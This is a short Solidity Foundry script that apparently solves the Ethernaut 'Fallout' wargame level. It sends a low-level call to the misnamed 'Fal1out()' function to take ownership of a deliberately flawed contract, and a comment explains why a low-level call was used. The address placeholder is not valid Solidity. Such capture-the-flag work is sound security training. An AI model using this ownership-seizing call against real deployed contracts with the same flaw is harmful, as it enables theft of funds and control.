// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the contract and Forge script/console utilities
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract FalloutSolution is Script {
    
    address falloutInstanceAddress = 0xYourInstanceAddressHere; // Replace with the actual instance address

    // Encoding the function signature of Fal1out() to send a low-level call
    bytes payload = abi.encodeWithSignature("Fal1out()");

    function run() external {
        // Start the broadcast, sending transactions from the account associated with PRIVATE_KEY
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Using a low-level call to interact with the contract
        falloutInstanceAddress.call(payload);

        // Stop the broadcast after all transactions are sent
        vm.stopBroadcast();
    }
}

/* 
Reason for using a low-level call:
The Fallout contract is written in Solidity 0.6.0, and to avoid compatibility issues that may arise with newer Solidity versions, 
such as 0.8.x, I opted to use a low-level call. This allows me to avoid the strict type checks and fallback handling introduced 
in later versions. With the low-level `call`, I can directly invoke the "Fal1out()" function by manually encoding its signature. 
This approach ensures compatibility without needing to modify the original contract's structure.
*/